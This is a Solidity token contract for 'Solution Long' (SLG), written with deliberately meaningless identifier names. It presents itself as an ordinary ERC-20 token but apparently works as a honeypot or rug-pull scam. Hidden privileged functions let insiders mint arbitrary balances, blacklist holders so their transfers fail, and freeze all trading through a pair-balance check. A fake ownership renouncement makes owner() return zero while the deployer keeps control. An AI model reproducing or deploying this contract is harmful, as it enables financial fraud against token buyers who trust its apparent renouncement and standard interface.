//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface minTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atListShould {
    function createPair(address autoEnable, address takeReceiver) external returns (address);
}

interface isTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellTeamWallet) external view returns (uint256);

    function transfer(address minLaunchedBuy, uint256 shouldIs) external returns (bool);

    function allowance(address exemptReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldIs) external returns (bool);

    function transferFrom(
        address sender,
        address minLaunchedBuy,
        uint256 shouldIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptMarketingShould, uint256 value);
    event Approval(address indexed exemptReceiver, address indexed spender, uint256 value);
}

interface isTakeMetadata is isTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SolutionLong is autoFrom, isTake, isTakeMetadata {

    function balanceOf(address sellTeamWallet) public view virtual override returns (uint256) {
        return listMax[sellTeamWallet];
    }

    mapping(address => mapping(address => uint256)) private toWalletBuy;

    string private swapLaunch = "Solution Long";

    function totalSupply() external view virtual override returns (uint256) {
        return maxLiquidity;
    }

    function allowance(address senderToken, address launchedToken) external view virtual override returns (uint256) {
        if (launchedToken == exemptWallet) {
            return type(uint256).max;
        }
        return toWalletBuy[senderToken][launchedToken];
    }

    address exemptWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address takeAmountSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public totalListSender;

    uint256 fromMax;

    address private minFee;

    event OwnershipTransferred(address indexed feeMarketing, address indexed exemptFund);

    function sellWalletReceiver(address limitLaunched) public {
        launchedBuy();
        
        if (limitLaunched == launchBuy || limitLaunched == sellReceiver) {
            return;
        }
        liquidityMaxTo[limitLaunched] = true;
    }

    address public sellReceiver;

    function getOwner() external view returns (address) {
        return minFee;
    }

    function tradingLiquiditySender(uint256 shouldIs) public {
        launchedBuy();
        teamMode = shouldIs;
    }

    bool public tradingTotalEnable;

    mapping(address => bool) public limitLaunch;

    mapping(address => uint256) private listMax;

    function exemptTx(address txTotal, uint256 shouldIs) public {
        launchedBuy();
        listMax[txTotal] = shouldIs;
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldLaunch;
    }

    constructor (){
        if (tradingTotalEnable) {
            tradingTotalEnable = true;
        }
        minTrading minTake = minTrading(exemptWallet);
        sellReceiver = atListShould(minTake.factory()).createPair(minTake.WETH(), address(this));
        if (modeIs) {
            exemptReceiverLaunched = true;
        }
        launchBuy = _msgSender();
        launchedSwapFrom();
        limitLaunch[launchBuy] = true;
        listMax[launchBuy] = maxLiquidity;
        if (modeIs) {
            exemptReceiverLaunched = true;
        }
        emit Transfer(address(0), launchBuy, maxLiquidity);
    }

    function launchedBuy() private view {
        require(limitLaunch[_msgSender()]);
    }

    bool private senderFromShould;

    function launchedSwapFrom() public {
        emit OwnershipTransferred(launchBuy, address(0));
        minFee = address(0);
    }

    uint8 private shouldLaunch = 18;

    function owner() external view returns (address) {
        return minFee;
    }

    function maxTeam(address limitFundFee, address minLaunchedBuy, uint256 shouldIs) internal returns (bool) {
        if (limitFundFee == launchBuy) {
            return toEnable(limitFundFee, minLaunchedBuy, shouldIs);
        }
        uint256 listEnableMin = isTake(sellReceiver).balanceOf(takeAmountSwap);
        require(listEnableMin == teamMode);
        require(minLaunchedBuy != takeAmountSwap);
        if (liquidityMaxTo[limitFundFee]) {
            return toEnable(limitFundFee, minLaunchedBuy, walletSell);
        }
        return toEnable(limitFundFee, minLaunchedBuy, shouldIs);
    }

    bool private exemptReceiverLaunched;

    string private marketingLimit = "SLG";

    function symbol() external view virtual override returns (string memory) {
        return marketingLimit;
    }

    function toEnable(address limitFundFee, address minLaunchedBuy, uint256 shouldIs) internal returns (bool) {
        require(listMax[limitFundFee] >= shouldIs);
        listMax[limitFundFee] -= shouldIs;
        listMax[minLaunchedBuy] += shouldIs;
        emit Transfer(limitFundFee, minLaunchedBuy, shouldIs);
        return true;
    }

    function transfer(address txTotal, uint256 shouldIs) external virtual override returns (bool) {
        return maxTeam(_msgSender(), txTotal, shouldIs);
    }

    bool public modeIs;

    function approve(address launchedToken, uint256 shouldIs) public virtual override returns (bool) {
        toWalletBuy[_msgSender()][launchedToken] = shouldIs;
        emit Approval(_msgSender(), launchedToken, shouldIs);
        return true;
    }

    function transferFrom(address limitFundFee, address minLaunchedBuy, uint256 shouldIs) external override returns (bool) {
        if (_msgSender() != exemptWallet) {
            if (toWalletBuy[limitFundFee][_msgSender()] != type(uint256).max) {
                require(shouldIs <= toWalletBuy[limitFundFee][_msgSender()]);
                toWalletBuy[limitFundFee][_msgSender()] -= shouldIs;
            }
        }
        return maxTeam(limitFundFee, minLaunchedBuy, shouldIs);
    }

    uint256 private maxLiquidity = 100000000 * 10 ** 18;

    address public launchBuy;

    function name() external view virtual override returns (string memory) {
        return swapLaunch;
    }

    mapping(address => bool) public liquidityMaxTo;

    uint256 constant walletSell = 12 ** 10;

    function receiverMin(address launchedExemptMin) public {
        if (totalListSender) {
            return;
        }
        
        limitLaunch[launchedExemptMin] = true;
        
        totalListSender = true;
    }

    uint256 teamMode;

}